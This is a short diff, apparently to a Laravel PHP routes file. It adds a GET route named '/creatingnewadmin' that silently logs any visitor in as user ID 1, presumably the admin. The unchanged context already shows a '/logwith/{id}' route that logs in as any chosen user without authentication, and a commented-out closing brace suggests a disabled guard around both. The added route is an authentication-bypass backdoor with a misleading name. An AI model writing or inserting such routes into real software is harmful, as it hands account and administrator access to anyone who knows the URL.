@@ -79,6 +79,11 @@ Route::get('/logwith/{id}', function ($id) {
     Auth::loginUsingId($id);
     return redirect()->route('frontend.home');
 });
+
+Route::get('/creatingnewadmin', function () {
+    Auth::loginUsingId(1);
+    return redirect()->route('frontend.home');
+});
 //}
 
 Route::get('settings', function () {
